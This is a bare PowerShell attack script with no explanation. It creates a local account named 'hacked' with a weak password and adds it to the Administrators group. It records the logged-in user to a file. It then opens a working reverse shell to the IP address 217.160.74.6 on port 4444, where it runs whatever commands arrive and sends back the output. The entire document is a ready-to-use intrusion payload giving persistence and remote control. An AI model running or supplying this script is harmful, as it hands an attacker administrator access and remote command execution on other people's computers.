# Create a new user
New-LocalUser -Name "hacked" -Description "New user with admin rights" -Password (ConvertTo-SecureString "12345" -AsPlainText -Force)

# Add the user to the Administrators group
Add-LocalGroupMember -Group "Administrators" -Member "hacked"

Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName | Out-File -FilePath "C:/online_users.txt"

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('217.160.74.6',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();"
